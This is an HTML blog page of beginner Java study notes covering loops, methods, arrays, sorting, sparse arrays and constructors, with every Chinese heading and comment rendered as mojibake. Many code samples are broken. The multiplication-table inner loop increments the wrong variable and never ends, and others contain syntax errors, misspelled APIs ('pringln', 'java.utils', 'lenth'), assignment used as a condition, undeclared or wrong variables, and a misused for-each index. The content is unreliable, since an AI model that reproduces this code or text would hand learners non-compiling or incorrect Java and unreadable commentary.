<h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆå§‹åŒ–//æ¡ä»¶åˆ¤æ–­//è¿­ä»£</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">	<span class="comment">//è¯­å¥</span></span><br><span class="line">	<span class="comment">//break</span></span><br><span class="line">	<span class="comment">//bontinue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆå§‹åŒ–å¯ä¸ºç©ºï¼Œæ¡ä»¶åˆ¤æ–­å¯ä¸ºç©º,è¿­ä»£å¯ä¸ºç©ºï¼Œå½“ä¸‰è€…å‡ä¸ºç©ºä½¿ä¸ºæ­»å¾ªç¯ã€‚</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹ï¼šä¹ä¹ä¹˜æ³•è¡¨"><a href="#ä¾‹ï¼šä¹ä¹ä¹˜æ³•è¡¨" class="headerlink" title="ä¾‹ï¼šä¹ä¹ä¹˜æ³•è¡¨"></a>ä¾‹ï¼šä¹ä¹ä¹˜æ³•è¡¨</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)&#123; <span class="comment">//è¡Œ</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;i++)&#123; <span class="comment">//åˆ—</span></span><br><span class="line">				System.out.print(i+<span class="string">&quot;x&quot;</span>+j+<span class="string">&quot;=&quot;</span>+(i*j)+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">				System.out.println();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹ï¼šæ‰“å°ç­‰è…°ä¸‰è§’å½¢"><a href="#ä¾‹ï¼šæ‰“å°ç­‰è…°ä¸‰è§’å½¢" class="headerlink" title="ä¾‹ï¼šæ‰“å°ç­‰è…°ä¸‰è§’å½¢"></a>ä¾‹ï¼šæ‰“å°ç­‰è…°ä¸‰è§’å½¢</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;=<span class="number">5</span>; i++&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">5</span>;j&gt;=i;j--)&#123;</span><br><span class="line">				System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">				System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">				System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¢å¼ºå‹for"><a href="#å¢å¼ºå‹for" class="headerlink" title="å¢å¼ºå‹for"></a>å¢å¼ºå‹for</h3><p>ä¸»è¦ç”¨äºéå†æ•°ç»„ä¸é›†åˆ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">int</span>[] num=&#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> x:num)&#123;</span><br><span class="line">				System.out.println(x);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println();</span><br><span class="line"><span class="comment">//ç±» å¯¹è±¡ æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="comment">//ä¸»æ–¹æ³•</span></span><br><span class="line">		<span class="type">int</span> sum=add(<span class="number">1333</span>,<span class="number">3222</span>);</span><br><span class="line">		System.out.print(sum); <span class="comment">//è¾“å‡º4555</span></span><br><span class="line"></span><br><span class="line">		<span class="type">Test</span> <span class="variable">su</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line">		<span class="type">int</span> sum2=su.sub(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">		System.out.print(sum2);<span class="comment">//è¾“å‡º-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;  <span class="comment">//addæ–¹æ³•ï¼ŒåŠ staticå£°æ˜ç±»æ–¹æ³•ï¼Œå¯ä»¥åœ¨ç±»ä¸­è¢«ç›´æ¥è°ƒç”¨</span></span><br><span class="line">		<span class="keyword">return</span> a+b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">substraction</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;  <span class="comment">//subæ³•ï¼Œä¸åŠ staticå£°æ˜å®ä¾‹æ–¹æ³•ï¼Œ</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é‡è½½"><a href="#é‡è½½" class="headerlink" title="é‡è½½"></a>é‡è½½</h2><ol>
<li>æ–¹æ³•åç§°å¿…é¡»ç›¸åŒ</li>
<li>å‚æ•°åˆ—è¡¨å¿…é¡»ä¸ç›¸åŒï¼ˆä¸ªæ•°ä¸ç›¸åŒï¼Œç±»å‹ä¸ç›¸åŒï¼Œæ’åˆ—é¡ºåºä¸ç›¸åŒï¼‰</li>
</ol>
<h2 id="å¯å˜ä¼ å‚"><a href="#å¯å˜ä¼ å‚" class="headerlink" title="å¯å˜ä¼ å‚"></a>å¯å˜ä¼ å‚</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line">		<span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">4</span></span><br><span class="line">		<span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">		arg(a,b,c,d);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">arg</span><span class="params">(<span class="type">int</span> a;<span class="type">int</span> b;<span class="type">int</span>... c)</span>&#123; <span class="comment">//ä¸å®šé¡¹å‚æ•°å¿…é¡»æ˜¯æœ€åä¸€ä¸ªå‚æ•°</span></span><br><span class="line">		<span class="comment">//è¯­å¥</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h2><p>æ–¹æ³•è‡ªå·±è°ƒç”¨è‡ªå·±ï¼Œé€’å½’å¿…é¡»è¦æœ‰åŸºä¾‹ï¼Œå³ç¨‹åºçš„å‡ºå£ï¼Œä¸ç„¶ä¼šå‘ç”Ÿæ ˆæº¢å‡ºã€‚</p>
<p>ä»¥é˜¶ä¹˜ä¸ºä¾‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> n*test(n-<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h1><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é»˜è®¤åˆå§‹åŒ–ï¼ŒåŒ…å«åœ¨åŠ¨æ€åˆå§‹åŒ–ä¸­ï¼Œæ²¡æœ‰è¢«èµ‹å€¼çš„å…ƒç´ ä½å°†è¢«èµ‹å…ƒç´ ç±»å‹çš„é»˜è®¤ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//é™æ€åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">int</span>[] num = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>&#125;; <span class="comment">//å»ºè®®ä¹¦å†™æ–¹å¼</span></span><br><span class="line"><span class="type">int</span> num[] = &#123;<span class="number">55</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,&#125;; <span class="comment">//å®šä¹‰å¹¶èµ‹å€¼ c c++ é£æ ¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åŠ¨æ€åˆå§‹åŒ– </span></span><br><span class="line"><span class="type">int</span>[] nums; <span class="comment">//å£°æ˜æ•°ç»„</span></span><br><span class="line">nums = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">100</span>]; <span class="comment">//åˆ›å»ºä¸€ä¸ªå®¹é‡ä¸º100çš„æ•°ç»„</span></span><br><span class="line">nums[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">nums[<span class="number">1</span>]=<span class="number">34</span>; <span class="comment">//ä¸ºæ•°ç»„èµ‹å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å–å€¼</span></span><br><span class="line">System.out.print(nums[<span class="number">1</span>]); <span class="comment">//ä»æ•°ç»„å–å€¼</span></span><br><span class="line">System.out.print(nums.length); <span class="comment">//è·å–æ•°ç»„é•¿åº¦ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//éå†æ•°ç»„</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i:nums)&#123;</span><br><span class="line">	System.out.print(nums[i-<span class="number">1</span>]); <span class="comment">//**æ³¨æ„æ­¤å¤„**</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æˆ–è€…</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.lenth;i++)&#123;</span><br><span class="line">	System.out.print(nums[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åè½¬æ•°ç»„</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] reverse(<span class="type">int</span>[] arrays)&#123;</span><br><span class="line">	<span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[arrays.length];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>,j=result.length-<span class="number">1</span>;i&lt;arrays.length;i++,j--)&#123;</span><br><span class="line">		result[i]=arrays[j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ•°ç»„çš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼Œå®šä¹‰ä¹‹åä¸å¯æ”¹å˜</span></span><br><span class="line"><span class="comment">//æœªè¢«èµ‹å€¼çš„ä½ç½®çš„å€¼ä¸ºè¯¥ä½ç½®é¢„å®šä¹‰ç±»å‹çš„é»˜è®¤å€¼ã€‚</span></span><br><span class="line"><span class="comment">//æ•°ç»„ä¸­å¿…é¡»æ˜¯ç›¸åŒçš„æ•°æ®ç±»å‹</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å¤šç»´æ•°ç»„"><a href="#å¤šç»´æ•°ç»„" class="headerlink" title="å¤šç»´æ•°ç»„"></a>å¤šç»´æ•°ç»„</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">int</span>[][] nums=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">4</span>&#125;,&#123;<span class="number">45</span>,<span class="number">56</span>&#125;&#125;;</span><br><span class="line">		System.out.pringln(nums[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™ç§æ•°ç»„é‡Œé¢åªèƒ½å­˜ä¸€ç§ç±»å‹çš„æ•°æ®ï¼ŒçœŸçš„æ˜¯å¥½æ†‹å¾—æ…Œã€‚</span></span><br></pre></td></tr></table></figure>

<h2 id="Arrayså¯¹è±¡"><a href="#Arrayså¯¹è±¡" class="headerlink" title="Arrayså¯¹è±¡"></a>Arrayså¯¹è±¡</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.utils.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">int</span>[] a=&#123;<span class="number">1</span>,<span class="number">434</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">4223</span>,<span class="number">56</span>,<span class="number">8</span>&#125;;</span><br><span class="line">		System.out.print(a); <span class="comment">//è¾“å‡ºhashcode</span></span><br><span class="line">		System.out.print(Arrays.toString(a))<span class="comment">//å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶æ‰“å°</span></span><br><span class="line">		Arrays.sort(a)</span><br><span class="line">		System.out.print(a) <span class="comment">//æ’åº</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.utils.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] sor(<span class="type">int</span>[] arrays)&#123;</span><br><span class="line">		<span class="type">int</span> k=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;arrays.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">			<span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (j=<span class="number">0</span>;j &lt; arrays.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span> (arrays[j]&gt;arrays[j+<span class="number">1</span>])&#123;</span><br><span class="line">						k = arrays[j+<span class="number">1</span>];</span><br><span class="line">						arrays[j+<span class="number">1</span>]=arrays[j];</span><br><span class="line">						arrays[j]=k;</span><br><span class="line">						flag +=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (flag=<span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">break</span>;   <span class="comment">//ä¼˜åŒ–ç®—æ³•</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> arrays;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ç¨€ç–æ•°ç»„"><a href="#ç¨€ç–æ•°ç»„" class="headerlink" title="ç¨€ç–æ•°ç»„"></a>ç¨€ç–æ•°ç»„</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å½“æ•°ç»„ä¸­å¤§éƒ¨åˆ†å…ƒç´ éƒ½ä¸º0ï¼Œæˆ–è€…æŠ¥é”™ç€ç›¸åŒçš„å€¼çš„æ—¶å€™ï¼Œå¯ä½¿ç”¨ç¨€ç–æ•°ç»„è¦é”æ•°ç»„å°ºå¯¸</span></span><br><span class="line"><span class="comment">//ç¬¬ä¸€è¡Œè®°å½•æ•°ç»„çš„è¡Œå’Œåˆ—ä»¥åŠæœ‰æ•ˆå€¼çš„æ•°é‡ï¼Œåé¢çš„è¡Œè®°å½•è®°å½•æ¯ä¸€ä¸ªæœ‰æ•ˆå€¼çš„è¡Œåˆ—ä»¥åŠå€¼</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/archives/3377d36c/Untitled.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//å°†äºŒç»´æ•°ç»„è½¬æ¢ä¸ºç¨€ç–æ•°ç»„</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] sparseArray(<span class="type">int</span>[] arr)&#123;</span><br><span class="line">		<span class="comment">//è·å–æœ‰æ•ˆå€¼çš„æ•°é‡</span></span><br><span class="line">		<span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> max=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length)&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;arr[i].length;j++)</span><br><span class="line">				<span class="comment">//è·å–æœ‰æ•ˆå€¼çš„è¡Œæ•°</span></span><br><span class="line">				<span class="keyword">if</span> (arr[i][j] !=<span class="number">0</span>)&#123;</span><br><span class="line">					sum++; </span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//è·å–æœ€å¤§çš„åˆ—æ•°</span></span><br><span class="line">				<span class="keyword">if</span> ((arr[i].length&gt;arr[i+<span class="number">1</span>].length) &amp;&amp; i&lt;(arr.length-<span class="number">2</span>))&#123;</span><br><span class="line">					max=arr[i].length;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//åˆ›å»ºç¨€ç–æ•°ç»„</span></span><br><span class="line">		<span class="type">int</span>[][] arrSpar = <span class="keyword">new</span> <span class="title class_">int</span>[sum+<span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">		arrSpar[<span class="number">0</span>][<span class="number">0</span>]=arr.length;</span><br><span class="line">		arrSpar[<span class="number">0</span>][<span class="number">1</span>]=max;</span><br><span class="line">		arrSpar[<span class="number">0</span>][<span class="number">2</span>]=sum;</span><br><span class="line">		<span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>;k&lt;arr.length;k++)&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> l=<span class="number">0</span>;l&lt;arr[k].length;l++)&#123;</span><br><span class="line">				<span class="keyword">if</span> (arr[k][l] !=<span class="number">0</span>)&#123;</span><br><span class="line">					count++;</span><br><span class="line">					arrSpar[count][<span class="number">0</span>]=k;</span><br><span class="line">					arrSpar[count][<span class="number">1</span>]=l;</span><br><span class="line">					arrSpar[count][<span class="number">2</span>]=arr[k][l];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> arr2;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//è¿˜åŸç¨€ç–æ•°ç»„</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] restoreSparseArray(<span class="type">int</span>[][] arrspar)&#123;</span><br><span class="line">			<span class="comment">//è¯­å¥ï¼Œæ˜å¤©å†å†™	</span></span><br><span class="line">			<span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[arrspar[<span class="number">0</span>][<span class="number">0</span>]][arrspar[<span class="number">0</span>][<span class="number">1</span>]];</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> h=<span class="number">1</span>;h&lt;arrspar.length;h++)&#123;</span><br><span class="line">				arr[arrspar[h][<span class="number">0</span>]][arrspar[h][<span class="number">1</span>]]=arrspar[h][<span class="number">2</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> arr;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h2 id="å†…å­˜åˆ†æ"><a href="#å†…å­˜åˆ†æ" class="headerlink" title="å†…å­˜åˆ†æ"></a>å†…å­˜åˆ†æ</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å †å†…å­˜ï¼šå­˜æ”¾newå‡ºæ¥çš„å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¯ä»¥è¢«æ‰€æœ‰çš„çº¿ç¨‹å…±äº«ï¼Œä¸ä¼šå­˜æ”¾åˆ«çš„å¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line"><span class="comment">//æ ˆå†…å­˜ï¼šå­˜æ”¾åŸºæœ¬å˜é‡ç±»å‹ï¼ˆå­˜æ”¾å˜é‡çš„å…·ä½“æ•°å€¼ï¼‰å¼•ç”¨å¯¹è±¡çš„å˜é‡ï¼ˆå­˜æ”¾è¿™ä¸ªå¼•ç”¨åœ¨å †é‡Œé¢çš„å…·ä½“åœ°å€ï¼‰</span></span><br><span class="line"><span class="comment">//æ–¹æ³•åŒºï¼šå¯ä»¥è¢«æ‰€æœ‰çº¿ç¨‹å…±äº«ï¼ŒåŒ…å«äº†æ‰€æœ‰çš„classå’Œstaticå˜é‡</span></span><br><span class="line"><span class="comment">//å£°æ˜æ•°ç»„æ—¶ï¼Œå‹æ ˆæ”¾å…¥ä¸€ä¸ªæ•°ç»„ æ­¤æ—¶ï¼Œæ•°ç»„å…¶å®å¹¶ä¸å­˜åœ¨</span></span><br><span class="line"><span class="comment">//åˆ›å»ºæ•°ç»„æ—¶ï¼Œåœ¨å †ç§åˆ›å»ºä¸€ç‰‡ç©ºé—´ç”¨ä»¥å­˜æ”¾æ•°ç»„çš„å€¼</span></span><br><span class="line"><span class="comment">//èµ‹å€¼æ•°ç»„ï¼Œå°†æ•°æ®æ”¾å…¥å †ä¹‹ä¸­</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="é¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#é¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="é¢å‘å¯¹è±¡ç¼–ç¨‹"></a>é¢å‘å¯¹è±¡ç¼–ç¨‹</h1><p><strong>é™æ€æ–¹æ³•</strong>-æœ‰staticå…³é”®å­—ï¼Œä¸éœ€è¦é€šè¿‡å¯¹è±¡è°ƒç”¨</p>
<p><strong>åŠ¨æ€æ–¹æ³•</strong>-æ— staticå…³é”®å­—ï¼Œéœ€è¦é€šè¿‡å¯¹è±¡è°ƒç”¨</p>
<p><strong>å½¢å‚</strong>-å‡½æ•°å®šä¹‰çš„æ—¶å€™æŒ‡å®šçš„å‚æ•°ï¼Œä½œä¸ºå ä½ç¬¦ä½¿ç”¨</p>
<p><strong>å®å‚</strong>-å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œå®é™…ä¼ å…¥çš„å‚æ•°</p>
<p><strong>å€¼ä¼ é€’</strong>-å°†å€¼å¤åˆ¶ä¸€ä»½è¿›è¡Œä¼ é€’ï¼Œå‡½æ•°å†…éƒ¨æ”¹å˜å‚æ•°çš„å€¼ï¼Œä¸ä¼šåº”ç”¨å¤–éƒ¨å˜é‡çš„å€¼ã€‚ <strong><code>JAVAä¸­å‡ä¸ºå€¼ä¼ é€’</code></strong> </p>
<p><strong>å¼•ç”¨ä¼ é€’</strong>-ä¼ é€’å€¼å¾—å†…å­˜åœ°å€ï¼Œæ”¹å˜å‡½æ•°ä¸­çš„å€¼å°†åŒæ­¥æ”¹å˜å¤–éƒ¨è¯¥å˜é‡çš„å€¼</p>
<p>åŒä¸€ä¸ªæ–‡ä»¶ä¸­å¯ä»¥æœ‰å¤šä¸ª<code>class</code>ï¼Œä½†åªèƒ½æœ‰ä¸€ä¸ª<code>public class</code>  </p>
<p>**æ„é€ å™¨ï¼š**å¿…é¡»ä¸ç±»ååŒåï¼Œä¸èƒ½æœ‰è¿”å›å€¼ï¼Œä¸”æ²¡æœ‰voidã€‚</p>
<p><strong><code>å±æ€§å°è£…ï¼Œç±»ç»§æ‰¿ï¼Œæ–¹æ³•é‡å†™ã€å¤šæ€</code></strong>  </p>
<p><strong>æ— å‚æ„é€ å™¨</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//æ„é€ æ–¹æ³•</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">	&#125;		</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä½¿ç”¨newçš„æ—¶å€™å¿…é¡»æœ‰æ„é€ å™¨</span></span><br></pre></td></tr></table></figure>

<p><strong>æœ‰å‚æ„é€ å™¨</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">		<span class="comment">//æœ‰å‚æ„é€ ï¼Œ**ä¸€æ—¦å®šä¹‰äº†æœ‰å‚æ„é€ ï¼Œæ— å‚å°±å¿…é¡»æ˜¾å¼å®šä¹‰**</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

